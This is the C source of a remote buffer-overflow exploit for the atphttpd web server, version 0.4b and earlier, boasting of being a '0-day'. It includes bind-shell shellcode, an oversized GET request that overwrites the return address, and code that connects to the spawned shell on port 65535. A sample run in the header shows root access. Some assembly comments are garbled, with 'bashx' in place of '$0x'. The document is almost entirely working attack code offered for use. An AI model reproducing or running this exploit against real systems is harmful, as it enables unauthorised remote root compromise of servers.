/******************************* 0-day ;]****************************************\
**********************************************************************************
** Remote atphttpd <= 0.4b linux exploit by r-code d_fence@gmx.net              **
**                                                                              **
** The exploit was successfuly tested against Debian 3.0 (Woody)                **
** and Red Hat 8.0 (Psyche) (both) with atphttpd 0.4b (latest)                  **
** installed from source..                                                      **
**                                                                              **
** The exploit gains the privilages of the user who runs atphttpd               **
** which is usually root.. the offsets may vary even for the same               **
** distros.. (e.g. on two different woody`s with the same athttpd               **
** installed on I got two different offsets working 1300 and 2400), so you      **
** you might have to play with them...                                          **
**                                                                              **
** example:	                                                                **
**                                                                              **
** bash~$ ./athttpd localhost 2400                                              **
**                                                                              **
**(<->) Atphttpd <= 0.4b remote exploit by r-code d_fence@gmx.net               **
**(<->) Greetz to: czarny,|stachu|, Nitro, Zami, Razor, Jedlik, Cypher          **
**                                                                              **
** <==> OFFSET: 0x8fc                                                           **
** <==> RET_ADDR: 0xbffff6fe                                                    **
** <==> Connecting to 'localhost' on port '80'..                                **
** <==> Sending packets..                                                       OO
**                                                                              **
** ### Exploit failed ... just kidding ;]                                       **
** ### Exploit successful - enjoy your shell                                    **
**                                                                              **
** uid=0(root) gid=0(root) groups=0(root)                                       **
**  23:25:51 up  3:21,  1 user,  load average: 0.44, 0.41, 0.42                 **
**  USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT       **
**  root     tty1     -                20:05    3:19m  2.32s  2.22s  -bash      **
**  Linux coredump 2.4.20 #1 czw sie 7 22:04:49 UTC 2003 i686 unknown           **
** /atphttpd-0.4b                                                               **
**readline: warning: rl_prep_terminal: cannot get terminal settingsbash-2.05a#  **
**********************************************************************************
**********************************************************************************/ 


#include <stdio.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/socket.h>
#include <errno.h>

/* Bind shellcode (port 65535) by Ramon de Carvalho Valle  */

char shellcode[]= /*  72 bytes                          */
    "\x31\xdb"              /*  xorl    %ebx,%ebx                 */
    "\xf7\xe3"              /*  mull    %ebx                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x43"                  /*  incl    %ebx                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x6a\x02"              /*  pushl   -bashx02                     */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\xb0\x66"              /*  movb    -bashx66,%al                 */
    "\xcd\x80"              /*  int     -bashx80                     */
    "\xff\x49\x02"          /*  decl    0x02(%ecx)                */
    "\x6a\x10"              /*  pushl   -bashx10                     */
    "\x51"                  /*  pushl   %ecx                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\x43"                  /*  incl    %ebx                      */
    "\xb0\x66"              /*  movb    -bashx66,%al                 */
    "\xcd\x80"              /*  int     -bashx80                     */
    "\x89\x41\x04"          /*  movl    %eax,0x04(%ecx)           */
    "\xb3\x04"              /*  movb    -bashx04,%bl                 */
    "\xb0\x66"              /*  movb    -bashx66,%al                 */
    "\xcd\x80"              /*  int     -bashx80                     */
    "\x43"                  /*  incl    %ebx                      */
    "\xb0\x66"              /*  movb    -bashx66,%al                 */
    "\xcd\x80"              /*  int     -bashx80                     */
    "\x59"                  /*  popl    %ecx                      */
    "\x93"                  /*  xchgl   %eax,%ebx                 */
    "\xb0\x3f"              /*  movb    -bashx3f,%al                 */
    "\xcd\x80"              /*  int     -bashx80                     */
    "\x49"                  /*  decl    %ecx                      */
    "\x79\xf9"              /*  jns     <bindsocketshellcode+45>  */
    "\x68\x2f\x2f\x73\x68"  /*  pushl   -bashx68732f2f               */
    "\x68\x2f\x62\x69\x6e"  /*  pushl   -bashx6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\x89\xe1"              /*  movl    %esp,%ecx                 */
    "\xb0\x0b"              /*  movb    -bashx0b,%al                 */
    "\xcd\x80"              /*  int     -bashx80                     */;

#define LEN 820
#define DEFAULT_OFFSET 2400         /* Offsets might be betwen 1000-3000 , you can try in 100 steps*/
#define PORT 80                     /* Default port */
#define ALIGN 1
    
int connect_to_host(char *hs,int port)
{
        int                     sock,x;
        struct sockaddr_in      addr;
	struct hostent  *host;
	
	if(!(host = gethostbyname(hs))) {
		perror("gethostbyname(): while resolving host");
		exit(1);
	}
	
	
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
	bcopy(host->h_addr,&addr.sin_addr,host->h_length);

        if((sock = socket(AF_INET, SOCK_STREAM, 0))<0)         {
                perror("socket() error");
                return(-1);
        }

        if((x = connect(sock, (struct sockaddr *)&addr, sizeof(addr)))<0) {
                perror("connect() error");
                return(-1);
        }

        return sock;
}



void shell(int sd)
{
	    int check;
	    char cmd[]="id; w; uname -a; pwd;export TERM=vt100; exec /bin/bash -i\n";
	    char buf[2048];
            fd_set fd;

            bzero(buf,2048);
	    send(sd,cmd,strlen(cmd),0);

	    while(1)  {
	
		    fflush(stdout);
		    FD_ZERO(&fd);
		    FD_SET(sd,&fd);
		    FD_SET(STDIN_FILENO,&fd);
		    select(sd+1,&fd,NULL,NULL,NULL);
		
		    if(FD_ISSET(sd,&fd))   {
			    if((check=read(sd,buf,2048))<=0)
				    exit(1);
			
			buf[check]=0;
			printf("%s",buf);
		    }
		
		    if(FD_ISSET(STDIN_FILENO,&fd))    {
			    if((check=read(STDIN_FILENO,buf,2048))>0) {
			        buf[check]=0;
				write(sd,buf,check);
			    }
		    }
	    }
	    return;
}




int main(int argc,char **argv) {
	int i,sd;
	char http_req[LEN];
	unsigned long int ret=0,offset=DEFAULT_OFFSET;


	printf("(<->) Atphttpd <= 0.4b remote exploit by r-code d_fence@gmx.net\n");
	printf("(<->) Greetz to: czarny,|stachu|, Nitro, Zami, Razor, Jedlik, Cypher\n\n");
	

	if(argc<2 || argc>3){
		printf("[-] Usage: %s [host] <offset> #OFFset\n",argv[0]);
		return -1;
	}
			
	
	if(argc>2)
		offset=atoi(argv[2]);
	
	ret=0xbffffffa - offset;
	
	printf("<==> OFFSET: 0x%x\n",offset);
	printf("<==> RET_ADDR: 0x%x\n",ret);
			

	/* See comment few lines below ;] */
	
	http_req[0x00]='G';
	http_req[0x01]='E';
	http_req[0x02]='T';
	http_req[0x03]=' ';
	http_req[0x04]='/';
	
	 for(i=0x05;i<LEN;) {
		 http_req[ALIGN + i++] = (ret & 0x000000ff);
		 http_req[ALIGN + i++] = (ret & 0x0000ff00) >> 8;
		 http_req[ALIGN + i++] = (ret & 0x00ff0000) >> 16;
		 http_req[ALIGN + i++] = (ret & 0xff000000) >> 24;
	 }

	
	 for(i=0x05;i<(LEN/2);i++)
		 http_req[i]=0x41;          /* Using jump-next instruction instead of nops for a better look ;] */
	     
         for(i=0;i<strlen(shellcode);i++)
	         http_req[(LEN/2)-(strlen(shellcode)/2)+i]=shellcode[i];
		     
	 
	http_req[LEN-0x0c]=' ';
	http_req[LEN-0x0b]='H';
	http_req[LEN-0x0a]='T';
	http_req[LEN-0x09]='T';
	http_req[LEN-0x08]='P';
	http_req[LEN-0x07]='/';
	http_req[LEN-0x06]='1';
	http_req[LEN-0x05]='.';
	http_req[LEN-0x04]='1';
	http_req[LEN-0x03]=0x0d;
	http_req[LEN-0x02]=0x0a;
	http_req[LEN-0x01]=0x00;

	/* Yeah.. I know I just could strcpy/cat it ;].. but so it looks soooooo l33t ;] aint`t it ? ;) */
	
	printf("<==> Connecting to '%s' on port '%d'..\n",argv[1],PORT);
	
	if((sd=connect_to_host(argv[1],PORT))<0) {
		printf("<==> Couldn`t connect to host.. :-/\n");
		exit(1);
	}
	
	printf("<==> Sending packets..\n");
			
		
	if(send(sd,http_req,LEN,0)<0) {
		perror("<==> send(): while sending evil http request");
		return -1;
	}

	close(sd);
		
	if((sd=connect_to_host(argv[1],65535))<0) {
		printf("<==> Exploit failed..! #Probably due to a bad offset\n");
		return -1;
	}


	printf("\n### Exploit failed ");
	fflush(stdout);
	sleep(1);
	printf("... just kidding ;]\n");
	sleep(1);
	printf("### Exploit successful - enjoy your shell\n\n");
	shell(sd);
	
	return 1;
}




